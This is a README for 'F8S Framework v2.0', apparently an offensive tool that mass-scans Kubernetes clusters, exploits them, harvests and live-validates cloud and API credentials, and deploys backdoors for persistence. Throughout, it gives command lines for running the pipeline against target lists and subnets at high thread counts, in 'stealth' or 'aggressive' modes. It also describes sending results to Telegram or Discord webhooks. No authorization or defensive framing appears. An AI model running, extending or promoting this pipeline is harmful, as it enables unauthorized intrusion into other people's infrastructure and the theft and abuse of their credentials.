# 🚀 F8S Framework v2.0 - Complete Refactored Architecture

## Overview

The F8S Framework has been completely refactored to address architectural issues and provide a unified, robust Kubernetes exploitation pipeline. This new version solves the problems of:

- ✅ **Multiple entry points** → Single `main.py` entry point
- ✅ **Missing imports** → Properly structured modules
- ✅ **Chaotic structure** → Clean modular architecture  
- ✅ **Circular dependencies** → Clear separation of concerns
- ✅ **No unified pipeline** → Complete scan → exploit → extract → validate → notify pipeline

## 🏗️ Architecture

```
F8S_FRAMEWORK/
├── main.py                    # 🎯 SINGLE ENTRY POINT
├── core/
│   ├── orchestrator.py        # Main pipeline coordinator
│   ├── session_manager.py     # Session tracking with UUID
│   └── error_handler.py       # Robust error handling & retry
├── modules/
│   ├── scanner/              # Phase 1: Kubernetes Discovery
│   ├── exploiter/            # Phase 2: CVE-aware Exploitation
│   ├── extractors/           # Phase 3: Advanced Credential Extraction
│   ├── validators/           # Phase 4: Real-time Service Validation
│   └── persistence/          # Phase 5: Access Maintenance
├── integrations/             # Telegram/Discord/Web/API
├── utils/                    # Shared utilities (targeting, rate limiting)
├── reporting/               # Multi-format report generation
└── config/                  # Centralized YAML configuration
```

## 🚀 Quick Start

### Basic Usage

```bash
# Help and options
python3 main.py --help

# Single target scan
python3 main.py --target 10.0.0.1 --mode scan

# File-based exploitation
python3 main.py --targets targets.txt --mode exploit --threads 100

# All phases with notifications
python3 main.py --targets targets.txt --mode all --threads 500 \
  --telegram-token YOUR_TOKEN --telegram-chat YOUR_CHAT

# Stealth mode with web interface
python3 main.py --target example.com --mode stealth --threads 5 --web

# Mail services focus
python3 main.py --targets 192.168.1.0/24 --mode mail --threads 200
```

### Advanced Usage

```bash
# High-throughput with custom timeouts
python3 main.py --targets big_list.txt --mode aggressive \
  --threads 1000 --timeout 5 --retry-count 2

# Export in different formats
python3 main.py --target 10.0.0.1 --mode all \
  --export-format csv --output ./custom_results

# Skip validation phase for speed
python3 main.py --targets targets.txt --mode exploit \
  --skip-validation --threads 500

# Debug mode with verbose output
python3 main.py --target test.com --mode scan \
  --debug --verbose
```

## 🎯 Operation Modes

| Mode | Description | Use Case |
|------|-------------|----------|
| `scan` | Discovery only | Reconnaissance |
| `exploit` | Scan + Exploitation | Standard attacks |
| `mail` | Focus on mail services | Email infrastructure |
| `stealth` | Low-noise operations | Covert assessment |
| `aggressive` | All capabilities | Maximum impact |
| `all` | Complete pipeline | Full engagement |

## 📊 Pipeline Phases

### Phase 1: Discovery (Scanner)
- Advanced Kubernetes API detection
- Multiple port scanning (6443, 8443, 443, 80, 8080, 8001, 8888, etc.)
- Version fingerprinting
- Vulnerability assessment
- CIDR expansion support

### Phase 2: Exploitation (Exploiter)  
- CVE-aware exploitation
- Anonymous API access
- Privilege escalation
- Service account theft
- Kubelet exploitation
- Container escape techniques

### Phase 3: Credential Extraction (Extractor)
- Advanced pattern matching for:
  - AWS Access Keys/Secret Keys
  - GCP Service Account Keys
  - Azure Client Secrets
  - JWT Tokens
  - SendGrid API Keys
  - GitHub Tokens
  - SSH Private Keys
  - Database URLs
- Context-aware confidence scoring
- Risk level assessment

### Phase 4: Service Validation (Validator)
- Real-time credential validation
- AWS/GCP/Azure service testing
- Permission enumeration
- Quota checking
- Service availability verification

### Phase 5: Persistence (Persistence)
- Access maintenance
- Token renewal
- Backdoor deployment
- Cleanup mechanisms

## 🔧 Configuration

The framework uses YAML configuration with environment variable overrides:

```yaml
# config/f8s_config.yaml
core:
  max_concurrent_targets: 100
  timeout_per_operation: 15
  retry_count: 3

modules:
  scanner:
    enabled: true
    ports: [6443, 8443, 443, 80, 8080]
  
  exploiter:
    enabled: true
    aggressive_mode: false
    
integrations:
  telegram:
    enabled: false
    token: null
    chat_id: null
```

### Environment Variables

```bash
export F8S_TELEGRAM_TOKEN="your_token"
export F8S_TELEGRAM_CHAT="your_chat_id"
export F8S_MAX_CONCURRENT=500
export F8S_OUTPUT_DIR="/custom/results"
```

## 📱 Integrations

### Telegram Notifications
```bash
python3 main.py --targets targets.txt --mode all \
  --telegram-token BOT_TOKEN --telegram-chat CHAT_ID
```

### Discord Webhooks
```bash
python3 main.py --targets targets.txt --mode all \
  --discord-webhook https://discord.com/api/webhooks/...
```

### Web Interface
```bash
python3 main.py --targets targets.txt --mode all --web
# Access: http://localhost:5000
```

### REST API
```bash
python3 main.py --targets targets.txt --mode all --api
# Access: http://localhost:8080
```

## 📊 Output Formats

### JSON (Default)
```json
{
  "session_info": {
    "session_id": "f8s_1234567890_abcdef",
    "mode": "exploit",
    "duration_seconds": 45.2
  },
  "summary": {
    "targets_processed": 100,
    "clusters_found": 15,
    "clusters_exploited": 8,
    "credentials_extracted": 25,
    "credentials_validated": 12
  }
}
```

### CSV Export
```bash
python3 main.py --targets targets.txt --export-format csv
```

### XML Export  
```bash
python3 main.py --targets targets.txt --export-format xml
```

## 🛡️ Error Handling

The framework includes robust error handling:

- **Retry Logic**: Configurable retry attempts with exponential backoff
- **Skip on Fail**: Continue to next target on failures
- **Session Tracking**: All operations tracked with unique session IDs
- **Error Statistics**: Comprehensive error reporting and analysis
- **Graceful Degradation**: Partial failures don't stop the entire pipeline

## 🎯 Key Features

### ✅ Solved Problems
- **Single Entry Point**: No more confusion between multiple launchers
- **Modular Architecture**: Clean separation of concerns
- **Unified Pipeline**: Consistent scan → exploit → extract → validate → notify flow
- **Session Management**: Proper tracking and resumption capabilities  
- **Error Resilience**: Skip failures and continue with remaining targets
- **Multi-format Output**: JSON, CSV, XML exports
- **Real-time Notifications**: Telegram/Discord integration
- **Comprehensive Logging**: Debug and audit capabilities

### 🚀 Performance Optimizations
- **Concurrent Operations**: Configurable thread pools
- **Rate Limiting**: Prevent overwhelming targets
- **Timeout Management**: Configurable timeouts per operation
- **Memory Efficiency**: Streaming results for large datasets
- **CIDR Expansion**: Intelligent subnet handling

### 🔒 Security Features
- **CVE Awareness**: Latest vulnerability exploitation
- **Stealth Mode**: Low-noise reconnaissance
- **Credential Validation**: Real-time service testing
- **Risk Assessment**: Automated credential risk scoring
- **Cleanup**: Artifact removal capabilities

## 📋 Session Management

Every F8S run creates a unique session:

```bash
# Sessions are automatically created with UUIDs
Session ID: f8s_1750801234_abcdef12

# Session data stored in ./sessions/
./sessions/session_f8s_1750801234_abcdef12.json

# Export session data
python3 -c "
from core.session_manager import SessionManager
sm = SessionManager()
sm.export_session('f8s_1750801234_abcdef12', 'session_export.json')
"
```

## 🧪 Testing

```bash
# Test framework components
python3 -c "
from modules.scanner.discovery import K8sDiscoveryScanner
from modules.exploiter.k8s_exploiter import K8sExploiter  
from modules.extractors.credential_extractor import CredentialExtractor
print('✅ All modules import successfully')
"

# Validate configuration
python3 main.py --config config/f8s_config.yaml --target 127.0.0.1 --mode scan --timeout 3
```

## 📈 Migration from Legacy

The legacy files (`launcher.py`, `ultimate_launcher.py`, etc.) are now replaced by the single `main.py` entry point. The new architecture provides:

- **Better maintainability** with modular design
- **Improved error handling** with retry mechanisms  
- **Enhanced reporting** with multiple export formats
- **Unified configuration** with YAML and environment variables
- **Session persistence** for operation tracking
- **Real-time notifications** for live monitoring

## 🤝 Contributing

The F8S Framework follows a modular architecture. To contribute:

1. **Core Components**: Modify `core/` for orchestration, session, or error handling
2. **Modules**: Add new capabilities in `modules/` following the existing pattern
3. **Integrations**: Add new notification services in `integrations/`
4. **Utils**: Add shared utilities in `utils/`

## 📄 License

F8S Framework v2.0 - Author: wKayaa

---

*This refactored version solves all major architectural issues while maintaining compatibility with existing workflows.*